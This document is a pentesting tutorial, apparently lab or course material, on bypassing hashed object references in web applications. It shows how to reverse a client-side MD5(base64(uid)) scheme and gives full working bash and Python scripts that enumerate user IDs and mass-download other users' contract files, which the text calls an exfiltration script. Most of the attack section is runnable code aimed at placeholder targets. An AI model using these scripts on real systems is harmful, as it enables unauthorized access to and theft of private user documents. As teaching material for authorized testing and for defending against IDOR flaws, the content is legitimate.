## Bypassing Encoded Object References

Encoded or hashed references appear secure at first glance because the values are not human-readable integers. The critical mistake developers make is performing the encoding or hashing on the front-end in JavaScript, which means the algorithm, its inputs, and its logic are fully visible to anyone who reads the page source. 

***

## The Identification Process

When you encounter a non-obvious parameter value like `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`, work through identification systematically before assuming it is secure:

```
Step 1: Identify the format
  32 hex characters = MD5
  40 hex characters = SHA1
  64 hex characters = SHA256
  Alphanumeric with = padding = base64
  URL-safe characters with - and _ = base64url

Step 2: Try hashing predictable single values first
  echo -n 1 | md5sum          → c4ca4238a0b923820dcc509a6f75849b  (no match)
  echo -n 'admin' | md5sum    → 21232f297a57a5a743894a0e4a801fc3 (no match)

Step 3: If single values fail, inspect JavaScript source
  Look for hash functions: CryptoJS.MD5(), SHA256(), btoa(), atob()
  Look for the variable being hashed before the API call
```

**In the browser:** Open DevTools (F12), go to the Sources tab, search across all JavaScript files for `MD5`, `SHA`, `btoa`, `hash`, or the parameter name (`contract`). 

***

## Reversing the Layered Hash (base64 then MD5)

The specific pattern in this example is a two-step transformation that looks secure but is entirely reproducible:

```javascript
// JavaScript in the page source reveals the exact algorithm
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString()
    }, "POST", "_self");
}
```

Reading this code left to right: take `uid`, run `btoa()` (base64 encode), then MD5 hash the result. Reproduce it in bash:

```bash
# Reproduce the algorithm for uid=1
echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'
# cdd96d3cc73d1dbdaffa03cc6cd7339b  ← matches the intercepted request exactly

# Critical flags:
# -n       = no newline appended to echo output (newline changes the hash)
# -w 0     = no line wrapping in base64 output (default wraps at 76 chars)
# tr -d ' -' = removes the trailing space and dash md5sum appends
```

Once the algorithm is confirmed to match, every other UID's hash is calculable:

```bash
# Pre-calculate all hashes for UIDs 1-20
for i in {1..20}; do
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    echo "UID $i → $hash"
done
```

***

## Mass Enumeration Script

With the hash algorithm reversed, the full exfiltration script is straightforward: 

```bash
#!/bin/bash

TARGET="http://TARGET_IP:PORT"
OUTPUT_DIR="./contracts"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting contract enumeration..."

for uid in {1..100}; do
    # Reproduce: MD5(base64(uid))
    hash=$(echo -n "$uid" | base64 -w 0 | md5sum | tr -d ' -')
    
    # Send POST request, save file with server-assigned name (-J), silently (-s)
    response=$(curl -s -o "$OUTPUT_DIR/contract_${hash}.pdf" \
                    -w "%{http_code}" \
                    -X POST \
                    -d "contract=$hash" \
                    "$TARGET/download.php")
    
    if [ "$response" == "200" ]; then
        filesize=$(wc -c < "$OUTPUT_DIR/contract_${hash}.pdf")
        if [ "$filesize" -gt 100 ]; then  # filter out empty/error responses
            echo "[+] UID $uid → contract_${hash}.pdf ($filesize bytes)"
        else
            rm -f "$OUTPUT_DIR/contract_${hash}.pdf"
        fi
    else
        rm -f "$OUTPUT_DIR/contract_${hash}.pdf" 2>/dev/null
    fi
done

echo "[*] Done. Files saved to $OUTPUT_DIR/"
ls -la "$OUTPUT_DIR/"
```

The `wc -c` size check filters out error responses disguised as 200s, which is a common issue where the server returns a 200 with an error message body rather than an actual file.

***

## Python Alternative with Session Handling

For targets requiring active authentication:

```python
import requests
import hashlib
import base64
import os

target = "http://target.com"
output_dir = "./contracts"
os.makedirs(output_dir, exist_ok=True)

# Log in first to get a valid session
session = requests.Session()
session.post(f"{target}/login.php", data={"username": "user1", "password": "pass1"})

for uid in range(1, 101):
    # Reproduce: MD5(base64(uid))
    b64 = base64.b64encode(str(uid).encode()).decode()
    hash_val = hashlib.md5(b64.encode()).hexdigest()
    
    r = session.post(
        f"{target}/download.php",
        data={"contract": hash_val}
    )
    
    if r.status_code == 200 and len(r.content) > 100:
        filepath = os.path.join(output_dir, f"contract_uid{uid}.pdf")
        with open(filepath, "wb") as f:
            f.write(r.content)
        print(f"[+] UID {uid}: {len(r.content)} bytes → {filepath}")
    else:
        print(f"[-] UID {uid}: no file (status {r.status_code})")
```

***

## Common Encoding Patterns to Recognise

When source code is not immediately available, recognising the encoding type from the output format guides your reverse-engineering effort: 

| Observable Pattern | Likely Algorithm | Reverse Approach |
|-------------------|-----------------|-----------------|
| 32 hex chars | MD5 | Try `echo -n INPUT \| md5sum` |
| 40 hex chars | SHA1 | Try `echo -n INPUT \| sha1sum` |
| 64 hex chars | SHA256 | Try `echo -n INPUT \| sha256sum` |
| Ends in `=` or `==` | base64 | `echo VALUE \| base64 -d` |
| URL-safe, ends in `%3D` | URL-encoded base64 | URL-decode first, then base64 decode |
| Long hex, no pattern | Possible AES/layered | Look for key in JavaScript source |
| Random-looking UUID | HMAC or keyed hash | Find the key in JavaScript or API config |

When the source code is available, always look for `CryptoJS`, `crypto`, `btoa`, `atob`, and hash function calls in JavaScript files, as developers routinely expose the full algorithm in client-side code under the mistaken assumption that obfuscation equals security. 
